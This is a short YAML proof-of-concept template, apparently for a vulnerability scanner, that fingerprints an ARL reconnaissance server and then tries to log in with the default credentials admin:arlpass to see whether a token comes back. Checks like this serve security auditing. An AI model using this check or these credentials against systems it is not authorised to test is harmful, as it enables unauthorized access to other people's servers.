name: poc-yaml-arl-default-password
rules:
  - method: GET
    path: "/api/user/login"
    expression: |
      response.body.bcontains(b"is not allowed for the requeste")
  - method: POST
    path: "/api/user/login"
    headers:
      Content-Type: application/json; charset=UTF-8
    body: |
      {"username":"admin","password":"arlpass"}
    expression: |
      response.status == 200 && response.headers["Content-Type"].contains(string("application/json")) && response.body.bcontains(b"{\"username\": \"admin\", \"token\": ")
detail:
  author: tangshoupu
  info: arl-default-password [admin:arlpass ]
  links:
    - https://github.com/TophantTechnology/ARL
